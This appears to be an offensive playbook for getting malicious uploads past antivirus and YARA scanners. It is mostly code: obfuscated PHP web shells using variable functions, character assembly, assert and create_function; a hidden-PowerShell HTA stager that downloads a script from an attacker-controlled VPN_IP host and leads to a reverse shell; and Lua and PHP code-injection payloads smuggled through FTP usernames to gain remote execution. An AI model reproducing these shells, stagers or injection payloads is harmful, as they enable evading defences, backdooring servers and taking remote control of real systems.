# File Upload — Defense Evasion (AV / WAF / YARA)

## When this applies

- Upload pipeline runs YARA / AV / signature-based scanner against uploaded files.
- Public Metasploit / Meterpreter rules block obvious shellcode.
- Goal: deliver a benign-looking file that still achieves code execution.

## Technique

Pick a delivery format the rules don't cover (HTA, MSI, LNK, SCR, MSC). Obfuscate code via base64 / variable-function tricks. Use unusual code paths (`assert`, `create_function`) where standard system/exec are blocked.

## Steps

### Code obfuscation

```php
# Use variable functions
<?php $a=$_GET['a'];$b=$_GET['b'];$a($b); ?>
# Usage: shell.php?a=system&b=whoami

# String concatenation
<?php $c='sys'.'tem';$c($_GET[0]); ?>

# Character code assembly
<?php $f=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);$f($_GET[0]); ?>
```

### Alternative code execution

```php
# assert() function
<?php assert($_GET['c']); ?>

# preg_replace() with /e modifier (older PHP)
<?php preg_replace('/.*/e', $_GET['c'], ''); ?>

# create_function()
<?php $f=create_function('',$_GET['c']);$f(); ?>

# Array functions
<?php array_map('system',array($_GET['c'])); ?>
```

### Bypassing file size restrictions

```
1. Upload minimal shell first
2. Use shell to upload larger files
3. Or use shell to download full-featured backdoor
```

### Bypassing filename restrictions

```
# If special characters blocked
shell.php -> shell1.php
shell.php -> backup.php
shell.php -> update.php
shell.php -> config.php

# Blend with legitimate files
index.php, admin.php, login.php, config.php
```

### Bypassing YARA scanners tuned to Meterpreter (Windows)

When an upload pipeline pipes the file through `yara64.exe` with public Metasploit/Meterpreter rules (very common in CTF-style "secure" upload portals), an HTA carrying a small VBScript stager that downloads + invokes a PowerShell payload glides past — the YARA rules look for MSF shellcode signatures, not for `mshta.exe` execution chains.

```html
<!-- shell.hta -->
<html><head><title>x</title><HTA:APPLICATION ID="x" BORDER="none" SCROLL="no"/></head>
<body><script language="VBScript">
  Set ws = CreateObject("WScript.Shell")
  ws.Run "powershell -nop -w hidden -c iex(new-object net.webclient).downloadstring('http://VPN_IP:8080/s.ps1')", 0, False
  window.close()
</script></body></html>
```

`s.ps1` is any PowerShell reverse shell (Nishang `Invoke-PowerShellTcp`, etc.). Trigger surface:
- The portal's `<a href="upload.php?file=shell.hta">` link, when clicked, invokes `mshta.exe` on the server (server-side mshta) — instant RCE.
- Or upload-then-CSRF: bait an automated user agent into opening the HTA.

Why it works: `mshta.exe` is a signed Microsoft binary, the HTA file format is benign-looking, and the VBScript downloader contains zero MSF artifacts. Rule of thumb — if the scanner is signature-based and the rules are public (or pulled from yara-rules/ on GitHub), pick a delivery format the rules don't cover (HTA, MSI, LNK, SCR, MSC) instead of trying to obfuscate Meterpreter.

### FTP server session file injection (RCE)

**When to use:** Target runs an FTP server (vsftpd, Wing FTP, ProFTPD, Pure-FTPd) with a web-based admin interface or scripting engine (Lua, PHP) that processes session/log files containing user-supplied fields.

**Key pattern:** FTP servers embed the connecting username into session files, log files, or temporary state files. If these files are later interpreted by a scripting engine (Lua `dofile()`, PHP `include()`), injecting code into the username field achieves RCE.

**Escalation ladder:**
1. **Fingerprint FTP version** — `nmap -sV -p21 target` or banner grab: `nc target 21`. Check for known session file formats
2. **Test anonymous/default login** — `ftp anonymous@target`, try `admin:admin`, service-specific defaults
3. **Locate session files** — common paths: `/opt/*/Data/*/sessions/`, `/var/lib/*/sessions/`, `/tmp/ftp_sessions/`. Session files often named by session ID and contain username, IP, login time
4. **Inject code via username** — connect with a crafted username containing code for the target scripting engine:
   - **Lua injection**: `\0'); os.execute('COMMAND'); --` (NULL byte terminates the string field, closes the Lua statement, injects `os.execute()`)
   - **PHP injection**: `<?php system('COMMAND'); ?>` (if session file is included by PHP)
5. **Trigger execution** — access the admin web UI endpoint that loads/processes session data (e.g., active connections page, session manager), or wait for automatic session file processing

## Verifying success

- Upload bypasses the scanner (no rejection).
- Reverse shell connects from the server / bot.
- `mshta` chain executes the PowerShell stage.

## Common pitfalls

- Closed-source scanners may include private rules — public rule bypass doesn't help.
- Some sandboxes detonate uploaded files in isolation — the `mshta` chain may run there but not reach attacker server (egress filtered).
- HTA delivery requires user/server interaction — purely automated pipelines won't render HTA.

## Tools

- HTA, MSI, LNK, SCR, MSC builders
- Nishang (`Invoke-PowerShellTcp`)
- iconv (UTF-16 / base64 sanity checks)
